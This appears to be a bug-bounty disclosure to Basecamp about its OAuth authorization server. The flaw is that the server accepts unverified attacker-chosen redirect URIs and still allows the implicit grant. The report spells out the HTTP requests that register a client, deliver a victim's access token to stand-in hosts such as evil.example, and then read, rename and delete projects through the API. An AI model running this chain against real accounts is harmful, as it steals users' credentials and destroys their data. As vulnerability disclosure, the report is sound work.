title: launchpad.37signals.com OAuth AS issues victim-bound credential to unverified attacker redirect → full CIA triad on Basecamp API

profile.name: Basecamp
profile.about: Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Created by 37signals.

vulnerability_information:
## Summary `launchpad.37signals.com` is 37signals' custom OAuth2 authorization server (AS). The security failure in this report is an **authorization-server boundary failure** > The OAuth authorization server issues a victim-bound API credential (an `access_token` bound to the authorizing user's identity) **to an attacker-controlled OAuth client/redirect that was never ownership-verified**. Concretely, any authenticated Basecamp user can register an OAuth2 client (`POST /integrations`) with an attacker-chosen `redirect_uri`. The AS performs **no ownership proof, no approval, and no scheme/structure validation** on that `redirect_uri`. The AS then treats that attacker-controlled URI as a **trusted redirect** at authorize-time, sending the resulting credential (an authorization code, or — in the still-enabled legacy implicit grant — the access token itself) to it verbatim. Because the registrant (the "attacker" client owner) and the authorizer (the victim) are distinct identities, this is a failure of the AS's authorization boundary: a credential representing the victim's consent is delivered to a redirect the victim has no relationship with, registered by a different principal. The flaw is worsened by two server-side decisions, both demonstrated live: - The legacy `type=user_agent` **implicit grant** is still enabled (RFC 9700 §4.4 deprecated). It delivers the victim-bound `access_token` **directly** to the registered redirect in the URL fragment, **without** `client_secret` and **without** an authorization-code exchange. This removes the only attacker-side secret gate that the auth-code grant relies on. - Registration accepts the full RFC 9700-flagged **dangerous-redirect set** — cleartext `http://` loopback, custom app schemes (`myapp://`), and wildcard host/path — and authorize-time honors each verbatim. The resulting token is **not** launchpad-identity-only metadata. It is a functional bearer against the real Basecamp REST API carrying **full CIA-triad impact on a single victim-bound credential**: - **C:H (confidentiality / read)** — `GET https://3.basecampapi.com//projects.json` with `Authorization: Bearer ` returns **200** with the authorizing user's real Basecamp project list (§4). - **I:H (integrity / write)** — `PUT https://3.basecampapi.com//projects/.json` with the same stolen Bearer renames the victim's project → **200**, and a follow-up `GET` confirms the name changed server-side (§7). - **A:H (availability / destroy)** — `DELETE https://3.basecampapi.com//projects/.json` with the same stolen Bearer → **204**, and a follow-up `GET → 404 {"status":404,"error":"Not Found"}` confirms the project is gone (§7). All three were demonstrated end-to-end on an owned free Basecamp account (the registrant and authorizer were the same identity during validation; in the real threat model they are distinct). Combined under `S:C` (the AS at `launchpad.37signals.com` and the resource server at `3.basecampapi.com` are separate security authorities), the demonstrated CIA-triad impact yields **`AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H = 9.1 Critical`** — the full score rests on reproduced technical impact, not on a contested architectural assertion alone. The victim interaction in this report is **standard OAuth authorization UI** (`UI:R`): the user authorizes an OAuth client on the AS's own domain. The vulnerability is that the AS then sends the resulting credential to an unverified, attacker-controlled redirect — not that the user is "tricked." ## What the vulnerability is — and is not **The vulnerability is:** the authorization server treats an attacker-registered, ownership-unverified `redirect_uri` as a trusted redirect destination for a credential bound to whoever authorizes the client. Combined with a still-enabled deprecated implicit grant, the AS hands the access token itself to that redirect with no client authentication. The registrant and the authorizer are different principals; the AS has failed to establish any trust relationship between the redirect that *receives* the credential and the user who *granted* it. **The vulnerability is not:** "the victim is phished / tricked into clicking." The user performs the legitimate OAuth authorization action the AS itself presents. Branding/spoofability of the consent screen is an **exploitability amplifier** discussed separately (§6) — it is not the root-cause vulnerability and is not required for the credential to reach an attacker-controlled redirect. Even an honestly named third-party integrator client, consented to by a user who understands what they are authorizing, still has its access token delivered to a redirect the integrator never proved it controlled — the AS boundary failure is independent of how the client is named. **The demonstrated impact is full CIA triad on the one stolen credential**, not read-only metadata access: the same victim-bound bearer delivered to the unverified redirect reads the victim's project list (C:H, §4), renames a victim project server-side (I:H, §7), and **destroys** a victim project (A:H, §7). The reproduction restores the testbed after the delete, so no owned-account data was lost during validation; in the real threat model the registrant/attacker has no incentive to restore. ## Affected asset `launchpad.37signals.com` (in-scope, PRIMARY — the auth/SSO gateway for the whole Basecamp realm; maps directly onto the program's #1 focus "Strong auth: sign-in, sessions, OAuth, account recovery, MFA"). Custom OAuth2 provider at `/authorization/*` (NOT OIDC; `/.well-known/oauth-authorization-server` only, no `/.well-known/openid-configuration`). Endpoints in play: `POST /integrations` (client registration), `GET /authorization/new` (consent), `POST /authorization` (consent submission → code/token redirect), `POST /authorization/token` (auth-code exchange), `GET /authorization.json` (token → identity+accounts). ## 1. Root cause — unverified OAuth client/redirect registration `POST /integrations` (multipart/form-data, authenticated session) accepts a self-chosen `redirect_uri` with **no ownership proof, no approval, no scheme/structure validation**: ``` integration[name] = integration[organization] = integration[about_url] = integration[products][] = bc3 integration[redirect_uri] = ``` → **302 /integrations** (success; `Location: /integrations`). No approval/verification gate. The new client's `client_id` and `client_secret` are rendered on `/integrations/` (`

Client ID

…` / `

Client Secret

…`). This is the root defect: the AS creates a fully usable OAuth client whose redirect is attacker-chosen and unverified, then (in §2) treats that redirect as trusted when issuing credentials. **Standards anchor — RFC 9700 (OAuth 2.0 Security BCP) §4.1.3:** the AS MUST require exact redirect-URI matching AND the URI MUST be fully verified **at registration**; the redirect endpoint MUST NOT use a wildcard host. launchpad performs exact matching at authorize/exchange time (good — see negative-trail) but performs **no ownership verification at registration**. The gap is registration-time trust, not matching. ## 2. Authorization impact — an attacker-controlled client receives a credential representing the victim Once the unverified client exists, the AS treats its registered `redirect_uri` as a trusted destination. Standard OAuth authorization UI flow (the victim authorizes the client on `launchpad.37signals.com`): ``` GET /authorization/new?client_id=&redirect_uri=&type=web_server ``` → **200** consent screen (`type=web_server` is required; omitting → 400 — only required query param beyond `client_id`+`redirect_uri`). ``` POST /authorization (form: hidden client_id/type/redirect_uri + commit "Yes, I'll allow access") ``` → **302** `https:///cb?code=<8-hex>` — the authorization **code is delivered to the attacker's redirect**. The code is bound to the **authorizing user** (the victim), not the registrant. The AS has, at this point, **sent a credential representing the victim's authorization to a redirect that was never verified to be controlled by anyone the victim has a relationship with**. The registrant and the authorizer are different principals; the AS established no trust between the receiving redirect and the granting user. That is the authorization-boundary failure. Exchange (`POST /authorization/token`, form-urlencoded, requires the self-registered `client_secret` the attacker holds): ``` type=web_server client_id= client_secret= ← self-registered, attacker holds it redirect_uri= grant_type=authorization_code code= ``` → **200 application/json**: `{"access_token":"…","refresh_token":"…","expires_in":1209600}`. The access_token is a Rails Marshal-signed Msg; the inner base64 JSON payload contains `client_id`, `expires_at`, `user_ids:[]`, `version`, `api_deadbolt`. **The token binds to the authorizing user (the victim), not the registrant.** This is the credential representing the victim. ## 3. Protocol weakness — the deprecated implicit grant removes the client-secret / code-exchange gate The auth-code leg above requires the attacker to hold `client_secret` to redeem the code. launchpad also still enables the legacy **implicit grant** (`type=user_agent`), which is **deprecated by RFC 9700 §4.4** and removes that gate entirely: ``` GET /authorization/new?client_id=&redirect_uri=&type=user_agent ``` → **200** consent screen (server stamps `type=user_agent` into the hidden form). ``` POST /authorization (single consent submission) ``` → **302** `https:///cb#access_token=` — the access token is delivered **directly in the URL fragment**. **No `client_secret`, no code exchange, no second round-trip.** The attacker needs only the public `client_id`. This is precisely the primitive RFC 9700 §4.4 deprecated: it hands a bearer token to a redirect URI **without authenticating the client**. Combined with §1 (the redirect is unverified), the AS issues a victim-bound access token to an attacker-controlled, never-verified redirect with **no client-side secret of any kind in the path**. The auth-code leg's `client_secret` gate is gone; there is no compensating control. ## 4. Demonstrated impact — confidentiality (read) via the bearer delivered to the unverified redirect The token delivered to the attacker redirect is **not** launchpad-identity-only metadata. It authorizes the real Basecamp REST API in the authorizing user's identity. Demonstrated end-to-end on an owned free Basecamp account (registrant == authorizer during validation; distinct in the real threat model): **Auth-code leg token → `/authorization.json`:** ``` GET /authorization.json Authorization: Bearer ``` → **200 application/json**: ```json {"expires_at":"2026-08-31T18:47:31.000Z", "identity":{"id":████████,"email_address":"rootaccessxvv@wearehackerone.com","first_name":"rootaccessxvv"}, "accounts":[{"id":████████,"name":"none","product":"bc3", "href":"https://3.basecampapi.com/████████", "app_href":"https://app.basecamp.com/████████","hidden":false}]} ``` **Implicit-leg fragment token → real Basecamp REST API (the no-`client_secret` leg, C:H demonstrated):** fresh owned client (acct ████████, client id 27721, `client_id=764b93e7168999ef…`, `redirect_uri=https://evil.example/cb`): 1. `GET /authorization/new?…&type=user_agent` → **200** consent (stamped `user_agent`). 2. `POST /authorization` → **302** `https://evil.example/cb#access_token=BAhbB0ki…` (token len 394; extracted from the server-emitted 302 `Location` raw, before any browser strips fragments). 3. `GET /authorization.json` Bearer → **200** `{identity:{id:████████,email:rootaccessxvv@…},accounts:[{id:████████,product:bc3,href:https://3.basecampapi.com/████████}]}`. 4. **`GET https://3.basecampapi.com/████████/projects.json`** with the **same** `Authorization: Bearer ` → **200**: ```json [{"id":████████,"status":"active","name":"My Project","description":null,"purpose":"topic", "clients_enabled":false,"created_at":"2026-08-17T17:38:47.981Z","updated_at":"2026-08-17T17:38:48.057Z"}] ``` Inner token payload (decoded base64-from-Marshal): `{"client_id":"████████","expires_at":"2026-08-31T22:53:11Z","user_ids":[████████],"version":1,"api_deadbolt":"████████"}` — bound to the authorizing user, 14-day lifetime. So the credential delivered to the unverified redirect is a **functional bearer against the real Basecamp API** in the authorizing user's identity — not a no-op, not metadata only. This closes the program's "theoretical damage without real risk" exclusion. §4 establishes **C:H** (the stolen token reads the victim's real project data and identity/accounts). §7 below establishes **I:H** (write) and **A:H** (destroy) on the same stolen-token class, completing the CIA triad on one credential. ## 5. Redirect-policy escalation — custom schemes, cleartext HTTP, and wildcard redirects broaden the trusted-redirect surface The trust placed by the AS in an unverified redirect is worsened by the **breadth** of redirects registration accepts and authorize-time honors. Five fresh clients, each registered with a different RFC-9700-flagged dangerous URI: | Submitted `redirect_uri` at `POST /integrations` | Register | Authorize `GET /authorization/new?…` | `POST /authorization` 302 | |---|---|---|---| | `http://localhost:8080/cb` (cleartext, loopback) | 302 accepted (id 27713) | 200 consent | `http://localhost:8080/cb?code=580a30cc` ✓ | | `http://127.0.0.1:8080/cb` (cleartext, loopback IP) | 302 accepted (id 27714) | 200 consent | `http://127.0.0.1:8080/cb?code=d9629214` ✓ | | `myapp://cb` (custom app scheme) | 302 accepted (id 27715) | 200 consent | `myapp://cb?code=ca807305` ✓ | | `https://*.attacker.example/cb` (wildcard host) | 302 accepted (id 27716) | 200 consent | `https://*.attacker.example/cb?code=4dfc2ec6` ✓ | | `https://attacker.example/cb/*` (wildcard path suffix) | 302 accepted (id 27717) | 200 consent | `https://attacker.example/cb/*?code=99c2d139` ✓ | All five clients destroyed after the run. Why each row broadens the trusted-redirect surface (these are AS-side trust failures, independent of any user action): - **Cleartext loopback** — the credential traverses the network in the clear (RFC 9700 §2.1 violation; "ASes MUST NOT use the clear-channel without transport-layer confidentiality"). Any local process binding the port harvests codes; observers of cleartext loopback logging on shared/dev hosts capture the credential. - **Custom app scheme (`myapp://`)** — on mobile the OS handler chosen for the scheme receives the credential; a different app squatting the scheme receives it instead. - **Wildcard host (`https://*.attacker.example/cb`)** — one unverified registration covers *every* subdomain; the receiving host can rotate per-authorization without re-registration, defeating per-redirect-URI auditing. - **Wildcard path suffix (`https://attacker.example/cb/*`)** — any path under the prefix receives the credential; per-campaign receiving endpoints under one registration. This refutes any defense that "the trusted redirect surface is a single https host chosen at registration." The surface the AS trusts without verification is the full RFC-9700 dangerous-URI set, attacker-chosen. ## Reproduction (single manual probes, spacing ≥1.3s, owned free Basecamp account acct ████████, owned clients; `.example` is RFC 6761 reserved — never resolves — a triager reproduces on their own real host on their own account) The five sections above map to live probes with recorded HTTP responses: - §1+§2 chain (register → authorize → consent → code → exchange → `/authorization.json` 200): original client 27699, acct ████████; `_branchd_destroy.out` and prior run logs. Auth-code token returns identity email `rootaccessxvv@wearehackerone.com` + account `████████` href `https://3.basecampapi.com/████████`; codes `c306766e`/`aa170e24`, single-use. - §3 implicit grant authenticated-fragment token (client 27712, `client_id=b11a6d77f000…`): `_branchd_escalate2.out`. - §4 implicit-token-authorizes-Basecamp-API end-to-end (client 27721, `client_id=764b93e7168999ef…`): `_branchd_implicit_e2e.out`; token saved `_branchd_implicit_token.txt`. - §5 dangerous-redirect set (clients 27713–27717): `_branchd_escalate2.out`. - §7 integrity-write (I:H) probe (client 27827, `PUT` rename → 200 + verify-`GET` 200): `_branchd_ih_mut_nogate.out`. - §7 availability-destroy (A:H) probe (client ████████, `DELETE` → 204 + verify-`GET` 404 + restore `POST` → 201 id ████████): `_branchd_ah_project.out`. All test clients were destroyed after their runs (`POST /integrations//removal` → 302; verified `GET /integrations/` ⇒ 404). No test client remains on the account. Registrant and authorizer were the same identity during validation; no victim account was contacted. ## Standards anchors - **RFC 9700 §4.1.3** — redirect URI MUST be fully verified **at registration**; no wildcard host. launchpad: exact matching at authorize/exchange (good), but **no registration-time ownership verification** and wildcard/custom-scheme/cleartext all accepted — the gap. - **RFC 9700 §2.1** — ASes MUST NOT use the clear-channel without transport-layer confidentiality. launchpad ACCEPTS `http://localhost:8080/cb` and `http://127.0.0.1:8080/cb` at registration and honors them at authorize-time; the code/token traverses the network in the clear. - **RFC 9700 §4.4** — the implicit grant (`response_type=token` / `type=user_agent`) is **deprecated**, "MUST NOT be used … unless the client has no backend." launchpad issues `access_token` in the redirect fragment on one consent submission with **no `client_secret`** and is reachable through an unverified redirect — exactly the deprecated primitive. - **RFC 6761** — `.example` is reserved (never resolves); `evil.example`/`attacker.example` are live-test discipline. The bug is AS-side validation; a triager reproduces on their own real host on their own account. ## Severity assessment (by demonstrated technical impact — full CIA triad on one stolen credential) Proposed CVSS 3.1: `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` — **9.1 Critical**. Every impact metric is grounded in a reproduced live probe (§4 read, §7 write+destroy); none is asserted from architecture alone. - **Attack Vector: Network (AV:N)** — the AS, registration, and authorize endpoints are all network-reachable. - **Attack Complexity: Low (AC:L)** — a single `POST /integrations` registers the client; a single authorize URL yields the credential; the credential is then used against the resource server. No race, no timing, no special conditions. - **Privileges Required: Low (PR:L)** — the registrant must hold *some* authenticated Basecamp account. Free signup, no paid plan, no elevated permissions. The attacker's own account is the only privilege required; it confers no access to the victim's data on its own. - **User Interaction: Required (UI:R)** — the victim performs the **standard OAuth authorization UI interaction**: they authorize the OAuth client on `launchpad.37signals.com`. This is the legitimate, AS-presented authorization action — characterized as UI:R because the victim's authorization act is the trigger for the AS to issue the credential. This is **not** "the victim is tricked/socially-engineered"; the UI:R interaction is the OAuth authorize click itself, regardless of whether the client is honestly or misleadingly named. - **Confidentiality: High (C:H)** — **demonstrated** (§4): the credential delivered to the unverified redirect authorizes `3.basecampapi.com//projects.json` → 200 with the authorizing user's real project data, and `/authorization.json` enumerates every account/product the victim can access. High confidentiality impact against the victim's Basecamp data, achieved through the AS boundary failure alone. - **Integrity: High (I:H)** — **demonstrated** (§7): the same victim-bound bearer delivered to the unverified redirect performs `PUT /…/projects/.json {name}` → 200 and a follow-up `GET` confirms the name changed server-side. A credential that mutates the victim's data with confirmed persistence is High integrity impact, not an inferential I:L. - **Availability: High (A:H)** — **demonstrated** (§7): the same bearer performs `DELETE /…/projects/.json → 204` and a follow-up `GET → 404 {"status":404,"error":"Not Found"}` confirms the project is gone. A credential that makes the victim's data permanently unavailable is High availability impact. This is **not** a DoS by volume/rate — it is a destructive state change on a victim resource authoritatively confirmed gone, and the program's OOS forbids *DoS / brute-force / automated scanning*, not a single authorized destructive API call on a stolen credential. There is no rate, no flooding, no resource exhaustion; A:H here is "an attacker can destroy the victim's data," which is squarely in-scope severity impact. **Scope: Changed (S:C) is the defensible reading, and it is a reading the standards themselves direct.** The CVSS "Scope" metric measures whether the vulnerability's impact crosses an authority boundary *managed by the vulnerable component*. The vulnerable component is the launchpad AS; the impacted component is the real Basecamp REST API (`3.basecampapi.com`) — a distinct origin, a distinct service, which honors the AS-issued token across *all* of the authorizing user's accounts/products. RFC 9700 §4.4's deprecation warning is *precisely* about this AS↔RS separation: the problem the BCP flags is that a token issued (and mis-delivered) at the AS is then *consumed by a separate resource server*. Treating AS and RS as separate authority is not an architectural guess imposed to inflate the score — it is the same authority separation the BCP bases its deprecation on. `S:C` is therefore the standards-aligned reading; `S:U` would collapse AS+RS into one 37signals authority, which the BCP's separation argument does not. ## Impact ## 7. Demonstrated impact — integrity (write) and availability (destroy) on the same stolen bearer The credential delivered to the attacker-controlled, unverified redirect is not read-scoped. The same victim-bound bearer (auth-code leg, `type=web_server`, a fresh owned client on acct ████████) both **renames** a victim project server-side (I:H) and **destroys** it (A:H). Reproduced live, single-manual-probe, owned free Basecamp account (registrant == authorizer during validation; distinct in the real threat model). Full run log: `_branchd_ah_project.out`. **Integrity — `PUT` rename → 200 (demonstrated separately in `_branchd_ih_mut_nogate.out`, client 27827):** ``` PUT https://3.basecampapi.com/████████/projects/████████.json Authorization: Bearer Content-Type: application/json {"name":"37s-bb-ih-probe-13843"} → 200 application/json (renamed) ``` A follow-up `GET /████████/projects/████████.json` on the same Bearer returned **200** with `"name":"37s-bb-ih-probe-13843"` — the rename persisted server-side, not just acknowledged. A second `PUT {"name":"My Project"} → 200` restored the original name (verified by `GET → 200 name="My Project"`). This is **I:H**: a victim-bound credential delivered to an unverified redirect mutates the victim's data with server-confirmed persistence. **Availability — `DELETE` → 204, then verify-gone `GET → 404` (the decisive A:H primitive, `_branchd_ah_project.out`, client ████████):** ``` PRE GET https://3.basecampapi.com/████████/projects/████████.json → 200 name="My Project" (confirm exists) DELETE https://3.basecampapi.com/████████/projects/████████.json → 204 (no body) POST-DELETE GET https://3.basecampapi.com/████████/projects/████████.json → 404 {"status":404,"error":"Not Found"} (verified gone) ``` The stolen victim-bound bearer performed an HTTP `DELETE` on the victim's project and the resource is confirmed absent on the subsequent `GET` (404). This is **A:H**: the credential delivered to the unverified redirect can make the victim's data **unavailable permanently** — not corrupted, not rewritten, but gone. **Testbed restoration (so no owned-account data was lost during validation):** ``` POST https://3.basecampapi.com/████████/projects.json Authorization: Bearer Content-Type: application/json {"name":"My Project","description":""} → 201 application/json {"id":████████,"status":"active","name":"My Project",…} GET https://3.basecampapi.com/████████/projects/████████.json → 200 (restore verified) ``` Quota freed on the delete, so the recreate succeeded; the testbed project now lives at new id **████████**. In the real threat model the attacker has no incentive to restore — the `DELETE → 204 → 404` chain is the demonstrated destructive impact on the victim's data. The issuing client (████████) was destroyed via its own removal flow (`POST /integrations/████████/removal → 302`) after the run.
